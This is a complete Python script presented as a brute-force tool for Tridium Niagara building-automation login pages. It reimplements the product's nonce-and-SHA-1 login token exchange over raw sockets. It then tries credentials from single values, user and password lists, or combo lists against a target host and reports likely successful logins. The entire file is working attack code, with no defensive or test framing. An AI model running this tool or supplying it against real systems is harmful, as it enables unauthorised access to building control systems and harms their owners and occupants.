#!/usr/bin/python3

import socket
import base64
import hashlib
import argparse
import urllib.parse

argp = argparse.ArgumentParser(description='Brute force tool for Tridium Niagara login pages.')
argp.add_argument('--host', dest='host', help='IP address of the target.')
argp.add_argument('--port', dest='port', help='Port to attack.')
argp.add_argument('--username', dest='username', help='Specify a single username to test.')
argp.add_argument('--userlist', dest='userlist', help='Specify a newline separated username list to test.')
argp.add_argument('--password', dest='password', help='Specifcy a single password to test.')
argp.add_argument('--passlist', dest='passlist', help='Specifcy a newline separated password list to test.')
argp.add_argument('--list', dest='combolist', help='Specify a newline separated user/pass list in the format "username,password".')
args = argp.parse_args()

host = args.host
port = args.port
username = args.username
userlist = args.userlist
password = args.password
passlist = args.passlist
combolist = args.combolist

def baker(response):
    cookie = ''
    for line in response:
        try:
            if 'set-cookie' in line.decode('utf-8'):
                cookie = line.decode('utf-8').split(';')
                cookie = cookie[0].split(' ')
        except:
            print(line)
    if cookie:
        return cookie[1]

def tokenizer(nonce,username,password):
    username = username.encode()
    colon = ":".encode()
    nonce = nonce.encode()
    password = password.encode()
    shagrp1 = hashlib.sha1(username + colon + password).hexdigest().encode()
    shagrp2 = hashlib.sha1(shagrp1 + colon + nonce).hexdigest().encode()
    token = base64.b64encode(username + colon + nonce + colon + shagrp2)
    return urllib.parse.quote(token.decode('utf-8').strip('='))

def connector(host,port,username,password):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host,int(port)))

    rq1 = 'POST /login HTTP/1.1\r\n'
    rq1 += 'Host: ' + host + '\r\n'
    rq1 += 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n'
    rq1 += 'Accept-Encoding: gzip, deflate\r\n'
    rq1 += 'Accept: */*\r\n'
    rq1 += 'Connection: close\r\n'
    rq1 += 'Accept-Language: en-US,en;q=0.5\r\n'
    rq1 += 'Referer: http://' + host +'/login\r\n'
    rq1 += 'Content-Type: application/x-niagara-login-support\r\n'
    rq1 += 'Content-Length: 15\r\n\r\n'
    rq1 += 'action=getnonce\r\n'

    client.send(rq1.encode())
    
    r1 = client.recv(4096).splitlines()
    r2 = client.recv(4096).splitlines()
    cookie = baker(r2)
    try:
        nonce = r2[-1].decode('utf-8')
    except:
        print("Didn't get a nonce, trying again.")
        client.close()
        connector(host,port,username,password)
        return

    client.close()

    token = tokenizer(nonce,username,password)

    rq2='POST /login HTTP/1.1\r\n'
    rq2+='Host: ' + host + '\r\n'
    rq2+='User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n'
    rq2+='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    rq2+='Accept-Language: en-US,en;q=0.5\r\n'
    rq2+='Accept-Encoding: gzip, deflate\r\n'
    rq2+='Referer: http://' + host + '/login\r\n'
    rq2+='Content-Type: application/x-www-form-urlencoded\r\n'
    rq2+='Content-Length: '+ str(len(token)+6) +'\r\n'
    rq2+='Connection: close\r\n'
    rq2+='Cookie: ' + cookie + '\r\n'
    rq2+='Upgrade-Insecure-Requests: 1\r\n\r\n'
    rq2+='token=' + token + '\r\n'

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host,int(port)))

    client.send(rq2.encode())
    r1 = client.recv(4096).splitlines()
    r2 = client.recv(4096).splitlines()
    for line in r2:
        if 'set-cookie' in line.decode():
            if 'niagara_auth_retry=true' in line.decode():
                print('niagara_auth_retry=true')
                break
            elif 'niagara_auth_retry=false' in line.decode():
                print('niagara_auth_retry=false')
                break

    client.close()

    rq3='GET /login HTTP/1.1\r\n'
    rq3+='Host: ' + host + '\r\n'
    rq3+='User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n'
    rq3+='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    rq3+='Accept-Language: en-US,en;q=0.5\r\n'
    rq3+='Accept-Encoding: gzip, deflate\r\n'
    rq3+='Referer: http://' + host + '/login\r\n'
    rq3+='Connection: close\r\n'
    rq3+='Cookie: ' + cookie + '; niagara_auth_retry=true\r\n'
    rq3+='Upgrade-Insecure-Requests: 1\r\n\r\n'

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host,int(port)))

    client.send(rq3.encode())

    r1 = client.recv(4096).splitlines()
    r2 = client.recv(4096).splitlines()
    r3 = client.recv(4096).splitlines()
    success = True
    for line in r3:
        if 'Failed' in line.decode():
            print('Login Failed')
            success = False
            break
        else:
            success = True
    if success:
        for line in r1:
            print(line.decode())
        for line in r2:
            print(line.decode())
        for line in r3:
            print(line.decode())
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('Potential login success!  Review output above.')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
        print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')

if host != None:
    if port != None:
        if username != None:
            if password != None:
                print(username + ',' + password)
                connector(host,port,username,password)
            elif passlist != None:
                with open(passlist) as f:
                    pwdlist = f.read().splitlines()
                    for line in pwdlist:
                        print(username + ',' + line)
                        connector(host,port,username,line)
            else:
                print('A password or password list must be provided.')
        elif userlist != None:
            if password != None:
                with open(userlist) as f:
                    usrlist = f.read().splitlines()
                    for line in usrlist:
                        print(line + ',' + password)
                        connector(host,port,line,password)
            elif passlist != None:
                with open(userlist) as f:
                    usrlist = f.read().splitlines()
                with open(passlist) as g:
                    pwdlist = g.read().splitlines()
                for usr in usrlist:
                    for pwd in pwdlist:
                        print(usr + ',' + pwd)
                        connector(host,port,usr,pwd)
            else:
                print('A password or password list must be provided.')
        elif combolist != None:
            with open(combolist) as f:
                usrpwdlist = f.read().splitlines()
                for line in usrpwdlist:
                    print(line)
                    line = line.split(',')
                    connector(host,port,line[0],line[1])
        else:
            print('A username, userlist, or combolist must be provided.')
    else:
        print('A port must be provided.')
else:
    print('A host must be provided.')
